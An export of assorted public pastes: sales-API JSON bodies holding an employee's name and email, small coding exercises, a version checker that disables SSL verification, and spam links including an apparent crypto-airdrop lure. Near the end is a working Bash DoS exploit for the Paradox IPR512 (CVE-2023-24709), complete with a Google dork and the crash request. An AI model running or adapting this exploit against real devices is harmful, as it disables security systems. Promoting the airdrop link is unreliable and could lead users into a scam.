id,title,username,language,date,content
kTkTb5MN,[POST] Filter My approval | http://bhpapisrvdev.berca.co.id:7029/api/DQFunnelServiceMSG/FunnelSalesA,septe001,JSON,Thursday 1st of February 2024 05:01:43 AM CDT,"{
""funnelStatusID"": """",
""commerceWorkflowStatus"": ""my approval"",
""serviceWorkflowStatus"": ""my approval"",
""dealCloseDateStartConvert"": """",
""dealCloseDateEndConvert"": """",
""salesID"": """",
""customerGenID"": """",
""dept"": """",
""itemID"": """",
""totalSellingPriceMin"": 0,
""totalSellingPriceMax"": 0,
""page"": 1,
""pageSize"": 50,
""userLoginID"": 1047,
""role"": ""Sales"",
""column"": ""funnelGenID"",
""sorting"": ""descending"",
""type"": ""sa"",
""salesAdmin"": """"
}"
nan04H1u,01. Format Lines,Spocoman,C++,Thursday 1st of February 2024 04:55:15 AM CDT,"#include <iostream>
#include <sstream>
#include <string>
#include <list>

using namespace std;

int main() {
    string line, word;
    getline(cin, line);

    list<string> words;

    while (line != ""###"") {
        istringstream ss(line);
        while (ss >> word) {
            words.push_back(word);
        }
        getline(cin, line);
    }

    int rowLength;
    cin >> rowLength;

    string outputLine = """";

    for (auto& w : words) {
        if (outputLine.length() + w.length() <= rowLength) {
            outputLine += w + ' ';
        }
        else {
            cout << outputLine.substr(0, outputLine.size() - 1) << endl;
            outputLine = w + ' ';
        }
    }

    cout << outputLine << endl;
    return 0;
}"
smRq4RZi,Untitled,sissou123,CSS,Thursday 1st of February 2024 04:46:53 AM CDT,"CSS - The Complete Guide 2024 (incl. Flexbox, Grid & Sass)
Learn CSS for the first time or brush up your CSS skills and dive in even deeper. EVERY web developer has to know CSS. 
What you'll learn
Learn why CSS is amazing, not something to be afraid of!
Use basic as well as advanced CSS features
Flexbox, grid, animations, transitions, fonts, media queries and much more - it's all included! 
for more:https://cuty.io/Dcs60N99nFxC
"
L07NK9xs,[PUT] Resubmit SA | http://bhpapisrvdev.berca.co.id:7029/api/DQFunnelServiceMSG/FunnelSalesAnalyst/R,septe001,JSON,Thursday 1st of February 2024 04:46:09 AM CDT,"{
    ""remark"": ""<p>test sdters</p>"",
    ""SalesFunnel"": {
        ""funnelGenID"": 420850,
        ""funnelID"": ""420850"",
        ""funnelStatusID"": 4773,
        ""dealCloseDate"": ""2024-02-01"",
        ""salesID"": 1052,
        ""customerGenID"": 38,
        ""endUserCustomerGenID"": 38,
        ""customerPICID"": 0,
        ""projectName"": ""voir - video optimization intensification resources"",
        ""gpmPctg"": -33.33,
        ""gpmAmount"": -1000,
        ""totalOrderingPriceProduct"": 1000,
        ""totalSellingPriceProduct"": 1000,
        ""totalOrderingPriceService"": 2000,
        ""totalSellingPriceService"": 2000,
        ""totalOrderingPrice"": 3000,
        ""totalSellingPrice"": 3000,
        ""presalesDeptID"": ""110010100"",
        ""pmoDeptID"": """",
        ""smoDeptID"": """",
        ""createUserID"": 0,
        ""reqDedicatedResource"": 140,
        ""estStartProjectDate"": ""2024-02-01T00:00:00.000Z"",
        ""estEndProjectDate"": ""2024-02-17T00:00:00.000Z"",
        ""actStartProjectDate"": ""2024-01-31T17:00:00.000Z"",
        ""actEndProjectDate"": ""2024-02-16T17:00:00.000Z"",
        ""estDurationProject"": 3,
        ""estDurationType"": ""years"",
        ""numOfMaxResource"": 0,
        ""poCustomerNo"": ""456456"",
        ""contractNo"": ""45645"",
        ""totalCostProduct"": 0,
        ""totalExpendProduct"": 0,
        ""totalCostService"": 1000,
        ""totalExpendService"": 0,
        ""so"": """",
        ""currency"": ""IDR"",
        ""flagKontrakPayung"": ""YES"",
        ""runRate"": ""NO"",
        ""createDate"": ""2024-02-01T10:43:07.182Z"",
        ""modifyDate"": ""2024-02-01T10:43:07.182Z"",
        ""modifyUserID"": 1052,
        ""deliveryDate"": ""2024-02-15T13:59:20.713Z"",
        ""projectCategory"": ""Implementation"",
        ""manDays"": 10000,
        ""flagContract"": 0
    },
    ""FunnelHeaderName"": {
        ""customerName"": ""PT TEST SEPTE"",
        ""endUserCustomerName"": ""PT TEST SEPTE"",
        ""currency"": ""IDR"",
        ""status"": ""success"",
        ""employeeKey"": 1052,
        ""employeeEmail"": ""satya.hapsara@msg.co.id"",
        ""employeeName"": ""Satya Hapsara. S. ST"",
        ""username"": ""satya.hapsara"",
        ""notes"": """",
        ""domain"": """",
        ""nilaiProject"": 0,
        ""flagCustomerBlacklist"": """",
        ""funnelOpportunityID"": """"
    },
    ""SalesFunnelItems"": [
        {
            ""funnelGenID"": 420850,
            ""dealRegNo"": """",
            ""funnelItemsID"": 621624,
            ""itemDescription"": ""full field"",
            ""itemID"": 3282,
            ""itemName"": ""3Dolphins"",
            ""itemSubID"": 3563,
            ""itemSubName"": ""3Dolphins"",
            ""itemType"": 18,
            ""orderingPrice"": 1000,
            ""sellingPrice"": 1000,
            ""dealRegExpiryDate"": ""1970-01-01T00:00:00.000Z"",
            ""supplierName"": ""TESTINDO,PT"",
            ""serviceCatalogFlag"": """",
            ""isRental"": 0,
            ""isUpdate"": 0,
            ""isDelete"": 0,
            ""isAdd"": 0,
            ""flagEdit"": ""0"",
            ""flagSalesSpesialis"": 0,
            ""salesSpesialis"": """"
        },
        {
            ""funnelGenID"": 420850,
            ""dealRegNo"": """",
            ""funnelItemsID"": 621623,
            ""itemDescription"": ""full field"",
            ""itemID"": 45459,
            ""itemName"": ""Selling Price TMI Service Engineering"",
            ""itemSubName"": """",
            ""itemType"": 19,
            ""orderingPrice"": 1000,
            ""sellingPrice"": 1000,
            ""dealRegExpiryDate"": ""1970-01-01T00:00:00.000Z"",
            ""supplierName"": """",
            ""serviceCatalogFlag"": """",
            ""isRental"": 0,
            ""isUpdate"": 0,
            ""isDelete"": 0,
            ""isAdd"": 0,
            ""flagEdit"": ""1"",
            ""flagSalesSpesialis"": null,
            ""salesSpesialis"": """"
        },
        {
            ""funnelItemsID"": 621625,
            ""funnelGenID"": 420850,
            ""itemType"": 19,
            ""itemID"": 45461,
            ""itemName"": ""Selling Price TMI Services Calibration Jakarta"",
            ""itemSubName"": """",
            ""processorType"": null,
            ""processorTypeName"": """",
            ""itemDescription"": ""USB Flashdisk"",
            ""orderingPrice"": 1000,
            ""sellingPrice"": 1000,
            ""dealRegNo"": """",
            ""createUserID"": 1052,
            ""supplierName"": """",
            ""serviceCatalogFlag"": """",
            ""flagEdit"": """",
            ""isRental"": 0,
            ""isUpdate"": 0,
            ""isDelete"": 0,
            ""isAdd"": 1,
            ""cbvNo"": """",
            ""flagSalesSpesialis"": null,
            ""salesSpesialis"": """"
        }
    ],
    ""salesFunnelCost"": [
        {
            ""funnelCostID"": 603597,
            ""funnelGenID"": 420850,
            ""funnelCostType"": 2231,
            ""costID"": 2254,
            ""cost"": 1000,
            ""createUserID"": 1052,
            ""createDate"": ""2024-01-21T17:00:00.000Z"",
            ""modifyDate"": null,
            ""costName"": ""Others Cost"",
            ""funnelCostTypeName"": ""Cost Service"",
            ""isUpdate"": 0,
            ""isDelete"": 0,
            ""isAdd"": 0
        }
    ],
    ""salesFunnelTop"": [],
    ""salesFunnelSplitPerformance"": []
}"
Dp4dK0Mz,Python: Software Version Checker,FocusedWolf,Python,Thursday 1st of February 2024 04:37:30 AM CDT,"#!/usr/bin/env python3

# Version 6

# POSTED ONLINE: https://pastebin.com/Dp4dK0Mz

import asyncio

class App:
    def __init__(self, name, installedVersion, patternData, urlData):
        self.name = name
        self.installedVersion = installedVersion
        self.__pattern = patternData[0]
        self.__patternMatchIndex = patternData[1]
        self.__url = urlData[0]
        self.__urlEncoding = urlData[1]

    async def GetLatestVersion(self):
        loop = asyncio.get_running_loop()
        latestVersion = await loop.run_in_executor(None, search_url, self.__pattern, self.__url, self.__urlEncoding, self.__patternMatchIndex)
        return latestVersion

    async def DisplayStatus(self, skipUpToDate=True):
        latestVersion = await self.GetLatestVersion()
        upToDate = self.installedVersion == latestVersion
        if latestVersion == None:
            print(color(' ! {}: Failed to detect the latest version (Installed Version: {} --> ?)\n   URL: {}\n'.format(self.name, self.installedVersion, self.__url), RED))
        elif upToDate and not skipUpToDate:
            print(color(' - {}: No update detected (Installed Version: {})\n'.format(self.name, latestVersion), GREEN))
        else:
            print(color(' * {}: Update detected (Installed Version: {} --> {})\n   URL: {}\n'.format(self.name, self.installedVersion, latestVersion, self.__url), YELLOW))
        return not upToDate

# -----

import re
def search_url(pattern, url, encoding='UTF-8', matchIndex=0, timeoutSeconds=10):
    response = download_url(url, encoding, timeoutSeconds)
    if response == None:
        return None
    matches = re.findall(pattern, response)
    if matches == None or len(matches) == 0:
        return None
    return matches[matchIndex]

import urllib.request
from urllib.error import *
import socket
def download_url(url, encoding='UTF-8', timeoutSeconds=10):
    try:
        response = urllib.request.urlopen(url, timeout=timeoutSeconds, context=unverifiedContext).read().decode(encoding)
    except HTTPError as error:
        print('   HTTP-Error: Data not retrieved because {}\n   URL: {}\n'.format(error, url))
    except URLError as error:
        if isinstance(error.reason, socket.timeout):
            print('   Timeout-Error: Data not retrieved because {}\n   URL: {}\n'.format(error, url))
        else:
            print('   URL-Error: Data not retrieved because {}\n   URL: {}\n'.format(error, url))
    else:
        return response

# Disable certificate verification with unverified SSL context.
# SOURCE: https://support.chainstack.com/hc/en-us/articles/9117198436249-Common-SSL-Issues-on-Python-and-How-to-Fix-it
import ssl
unverifiedContext = ssl._create_unverified_context()

# -----

# BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
UNDERLINE = '\033[4m'
RESET = '\033[0m'

def color(var, color):
    return color + str(var) + RESET

import platform
system = platform.system()
if system == 'Windows':
    import os
    # Needed to display colored text on Windows for some reason.
    os.system('cls')

# -----

# NOTE: You need to update these installed-version numbers manually, until you find a way to query them from the installed software directly.
apps = [
    App('Voicemeeter Banana', '2.0.6.8 (November 2022)', (r'Version ([0-9.]+ \([\w\s]+\))', 1),              ('https://voicemeeter.com', 'UTF-8')),
  # App('Voicemeeter Banana', '2.0.6.8',                 (r'Voicemeeter ([0-9.]+) \(ZIP Package\)', 0),      ('https://vb-audio.com/Voicemeeter/banana.htm', 'UTF-8')), # This website keeps dying...
    App('Equalizer APO',      '1.3.2',                   (r'EqualizerAPO64-([0-9.]+)\.exe', 0),              ('https://sourceforge.net/projects/equalizerapo/files/', 'UTF-8')),
    App('HeSuVi',             '2.0.0.1',                 (r'HeSuVi_([0-9.]+)\.exe', 0),                      ('https://sourceforge.net/projects/hesuvi/files/', 'UTF-8')),
    App('IEM Plug-in Suite',  '1.14.1',                  (r'Latest version: <strong>v([0-9.]+)', 0),         ('https://plugins.iem.at/download/', 'UTF-8')),
    App('Vim',                '9.1',                     (r'Vim ([0-9.]+) is the latest stable version', 0), ('https://www.vim.org/download.php/', 'ISO-8859-1')),
]

async def main():
    updateNeeded = False
    tasks = [app.DisplayStatus(False) for app in apps]
    for future in asyncio.as_completed(tasks):
        updateNeeded |= await future

    import sys
    if updateNeeded or len(sys.argv) == 1 or sys.argv[1] != 'nopause':
        wait_for_any_keypress()

# ----- Press any key to continue -----

def wait_for_any_keypress():
    import sys
    if sys.platform == 'win32':
        import os
        os.system('pause')
    elif sys.platform in ('linux2', 'darwin'):
        print('Press any key to continue . . .')
        import termios
        import tty
        stdin_file_desc = sys.stdin.fileno()
        old_stdin_tty_attr = termios.tcgetattr(stdin_file_desc)
        try:
            tty.setraw(stdin_file_desc)
            sys.stdin.read(1)
        finally:
            termios.tcsetattr(stdin_file_desc, termios.TCSADRAIN, old_stdin_tty_attr)

# -----

if __name__ == '__main__':
    asyncio.run(main())"
xPHRWYF2,microsoft,nirajs,Python,Thursday 1st of February 2024 04:23:13 AM CDT,"# you can write to stdout for debugging purposes, e.g.]
""""""

// [1,2,1,3,2,1,9,6,2,1,9], k = 2
print(""This is a debug message"")

key -> value 
value -> key


1 -> 2
2 -> 1

Space
    Linear

Time

    input n, k
    n + logn *k 
    k = 4

    n + logn*3


    (n) + log(n) *k => nlogn (k ~ n)



freqMap (key) => count
firstIndexMap (key) => first occurence


maxHeap (count, firstoccurence, ele) => top K

1,9,9,1,1,1,1,2,2,2,2,2,2, k =1

maxHeap 

9,2
1  2

heap
    top 
    peek()
    add()


""""""

from collections import defaultdict
import heapq


class solution

def getKthMostCommon(nums, k: int) -> list[int]:
    freqMap = defaultdict(int)
    indexMap = defaultdict(int)
    for index, ele in enumerate(nums):
        freqMap[ele] += 1
        if ele not in indexMap:
            indexMap[ele] = index

    # count, index, ele
    arr = []
    for key in freqMap:
        arr.append((-freqMap[key], -indexMap[key], key))

    heapq.heapify(arr)

    result = []

    for _ in range(k):
        freq, index, key = heapq.heappop(arr)
        result.append(key)

    return result


nums = [1,2,1,3,2,1,9,6,2,1,9]
k = 2
print(getKthMostCommon(nums,k))


""""""

Design Leetcode for your collage

3rd year students would be using.

Admin -> add question
Student -> use 

dashboard -> leaderboard.


Admin
User

Functionality (core Feture)
    
    User
        - User can submit a question
        - User can see the response of a question
        - user can explore the catalgoue
    
    Admin
        - Update the catagloue
        - Add new question, testcases (meta data )
        - 


    System
        - Support multiple language (C++, python)
        - Online editor, auto complettion


    configuration (intput) -> config
    input
        language 
        problem ID 

    => 
        dockerTemplate
            gcc contemnt.cpp
            python3 a.app 
        inputfiles 
        outfiles

        python
         obj = solution()
         solution.kthlarges()
        

        block some of executation.
        ex python 
        contiainer 
            virtualization 

    Leaderboard:
        userId
            how many question solved -> 
            Top K score of all userbase over some time period

    

    User
        - UserId, 
        - Profile
        - 
    
    UserQuestionStatus:
        UserId
        questionId:
        status:


    question:

    ScoreTable:
        - User
        - Score
        - 

    Cache
        UserId -> Score1
        SUserId -> Score2


        TopK: [UserId: score1, userId: score2] // BST OrderSet logn
     


    
    

Non functional:
    - Security aspects (sandboxing )
    - Scable 
    - Fast low latency (xx ms )
    - Observability 



Rate Limiter















""""""











"
jG3cfAj7,paste test,dolomite42,C,Thursday 1st of February 2024 04:17:48 AM CDT,"Pasted at: 01/02/2024 10:17
4416879f-96c1-40c2-a6a3-ededa0de6cc6@gmail.com"
VpRtPvVA,Untitled,Night___Hunter,Rust,Thursday 1st of February 2024 04:11:57 AM CDT,"use iced::Settings;
use iced::pure::widget::{Button, Column, Container, Text};
use iced::pure::Sandbox;
use main_page::MainPage;

mod main_page;


fn main() -> Result<(), iced::Error> {
    Counter::run(Settings::default())
}

struct Counter {
    count: i32,
    current_view: Views,
}

#[derive(Debug, Clone, Copy)]
pub enum Views {
    Counter,
    Main
}

#[derive(Debug, Clone, Copy)]
pub enum CounterMessage {
    Increment,
    Decrement,
    ChangePage(Views)
}

impl Sandbox for Counter {
    type Message = CounterMessage;

    fn new() -> Self {
        Counter { 
            count: 0,
            current_view: Views::Counter,
        }
    }

    fn title(&self) -> String {
        String::from(""Counter app"")
    }

    fn update(&mut self, message: Self::Message) {
        match message {
            CounterMessage::Increment => self.count += 1,
            CounterMessage::Decrement => self.count -= 1,
            CounterMessage::ChangePage(view) => self.current_view = view
        }
    }

    fn view(&self) -> iced::pure::Element<Self::Message> {
        let label = Text::new(format!(""Count: {}"", self.count));
        let incr = Button::new(""Increment"").on_press(CounterMessage::Increment);
        let decr = Button::new(""Decrement"").on_press(CounterMessage::Decrement);
        let navigate = Button::new(Text::new(""Go to the next page"")).on_press(CounterMessage::ChangePage(Views::Main));
        let col = Column::new().push(incr).push(label).push(decr).push(navigate).spacing(5);
        let counter_layout = Container::new(col).center_x().center_y().width(iced::Length::Fill).height(iced::Length::Fill);
        
        match self.current_view {
            Views::Counter => counter_layout.into(),
            Views::Main => MainPage::view(self)
        }
    }
}"
e98endsT,Untitled,Night___Hunter,Rust,Thursday 1st of February 2024 04:11:13 AM CDT,"use iced::{pure::{
    widget::{Container, Text},
    Element,
}, Length};

use crate::CounterMessage;

pub struct MainPage;

impl MainPage {
    pub fn view(state: &crate::Counter) -> Element<CounterMessage> {
        Container::new(Text::new(""Hello from Page 2"",
state.count

))
            .width(Length::Fill)
            .height(Length::Fill)
            .center_x()
            .center_y()
            .into()
    }
}"
J61LZtkj,List of all FREE Crypto Airdrops!_fork,ThePeeters,GetText,Thursday 1st of February 2024 04:09:55 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://claim-netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://claim-netdrop.netlify.app/

626206"
H9Px8in4,"Stackoverflow question, sample interfaces in Typescript",manger32,TypeScript,Thursday 1st of February 2024 03:59:58 AM CDT,"// Note: please restart the page if syntax highlighting works bad.
interface MyObject {
  id: number;
  name: string | null;
  age?: number | null;
  address?: string | null;
}

const myObj: MyObject = { id: 1, name: null, age: 30 };
function assignDefaults(a:MyObject, d:object)
{
  var r = a as MyObject;
  for (const k in d) {
      a[k] = a[k] ?? d[k];
  }
  return r;
}
// assignDefaults is my function
const newMyObj = assignDefaults(myObj, {
  name: 'Default Name',
  address: 'New York',
});

console.log(newMyObj) // desired output：{ id: 1, name: 'Default Name', age: 30, address: 'New York' }"
bi111mhu,23401,boyan1324,Python,Thursday 1st of February 2024 03:56:34 AM CDT,"sum_of_odd = 0
counter = 0
while True:
    command = input(""Enter a number or type 'END' to finish: "")
    if command == ""END"":
        print(sum_of_odd)
        break
    command = int(command)
    if counter <= 5:
        if command % 2 != 0:
            sum_of_odd += command
        counter += 1
    elif command == ""END"":
        print(sum_of_odd)
        break
"
SjRPNhdY,Settings,ERROR_CODE,Lua,Tuesday 30th of January 2024 05:24:38 AM CDT,"local UIGui = Instance.new(""ScreenGui"")
local SettingsFrameBackground = Instance.new()"
FZcrAaw7,Glua | DarkRP | Рандомное имя для игрока | Random RP NAME,CREONIX,Lua,Tuesday 30th of January 2024 05:14:20 AM CDT,"-- autorun/server/nick.lua

function SetRandomName(ply,gender)

	http.Fetch(""https://api.randomdatatools.ru/?params=FirstName,LastName&gender=""..gender, function(body,len,headers,code)

		local data = assert(util.JSONToTable(body))

		if code == 200 then

			if data.FirstName then

				DarkRP.storeRPName(ply,data.FirstName.."" ""..data.LastName)

			end

		end

	end)

end

hook.Add(""PlayerInitialSpawn"",""CheckRandomName"",function(ply)

	local Nick = ply:GetPData(""RandomNick"")

	if (Nick == nil) then -- чекер на проверку, установлено ли имя, устанавливает 1 раз

		ply:SetPData(""RandomNick"",1)

		SetRandomName(ply,""man"") -- man или woman

	end

end)"
KCUkxfjP,Paradox Security Systems IPR512 - Denial Of Service - CVE-2023-24709,FlyFar,Bash,Tuesday 30th of January 2024 04:53:01 AM CDT,"#!/bin/bash

# Exploit Title: Paradox Security Systems IPR512 - Denial Of Service
# Google Dork: intitle:""ipr512 * - login screen""
# Date: 09-APR-2023
# Exploit Author: Giorgi Dograshvili
# Vendor Homepage: Paradox - Headquarters <https://www.paradox.com/Products/default.asp?PID=423> (https://www.paradox.com/Products/default.asp?PID=423)
# Version: IPR512
# CVE : CVE-2023-24709

# Function to display banner message
display_banner() {
  echo ""******************************************************""
  echo ""*                                                    *""
  echo ""*                PoC CVE-2023-24709                  *""
  echo ""*      BE AWARE!!! RUNNING THE SCRIPT WILL MAKE      *""
  echo ""*    A DAMAGING IMPACT ON THE SERVICE FUNCTIONING!   *""
  echo ""*                                by SlashXzerozero   *""
  echo ""*                                                    *""
  echo ""******************************************************""
}

# Call the function to display the banner
display_banner
  echo """"
  echo """"
  echo ""Please enter a domain name or IP address with or without port""
read -p  ""(e.g. example.net or 192.168.12.34, or 192.168.56.78:999): "" domain

# Step 2: Ask for user confirmation
read -p ""This will DAMAGE the service. Do you still want it to proceed? (Y/n): "" confirm
if [[ $confirm == ""Y"" || $confirm == ""y"" ]]; then
  # Display loading animation
  animation=(""|"" ""/"" ""-"" ""\\"")
  index=0
  while [[ $index -lt 10 ]]; do
    echo -ne ""Loading ${animation[index]} \r""
    sleep 1
    index=$((index + 1))
  done

  # Use curl to send HTTP GET request with custom headers and timeout
  response=$(curl -i -s -k -X GET \
    -H ""Host: $domain"" \
    -H ""User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36"" \
    -H ""Accept: */"" \
    -H ""Referer: http://$domain/login.html"" \
    -H ""Accept-Encoding: gzip, deflate"" \
    -H ""Accept-Language: en-US,en;q=0.9"" \
    -H ""Connection: close"" \
    --max-time 10 \
    ""http://$domain/login.cgi?log_user=%3c%2f%73%63%72%69%70%74%3e&log_passmd5=&r=3982"")

  # Check response for HTTP status code 200 and print result
  if [[ $response == *""HTTP/1.1 200 OK""* ]]; then
    echo -e ""\nIt seems to be vulnerable! Please check the webpanel: http://$domain/login.html""
  else
    echo -e ""\nShouldn't be vulnerable! Please check the webpanel:  http://$domain/login.html""
  fi
else
  echo ""The script is stopped!.""
fi
            "
13xKepS9,qubes-mirage-firewall v0.8.3 - Denial Of Service (DoS) - CVE-2022-46770,FlyFar,Python,Tuesday 30th of January 2024 04:50:19 AM CDT,"# Exploit Title: qubes-mirage-firewall  v0.8.3 - Denial Of Service (DoS)
# Date: 2022-12-04
# Exploit Author: Krzysztof Burghardt <krzysztof@burghardt.pl>
# Vendor Homepage: https://mirage.io/blog/MSA03
# Software Link: https://github.com/mirage/qubes-mirage-firewall/releases
# Version: >= 0.8.0 & < 0.8.4
# Tested on: Qubes OS
# CVE: CVE-2022-46770
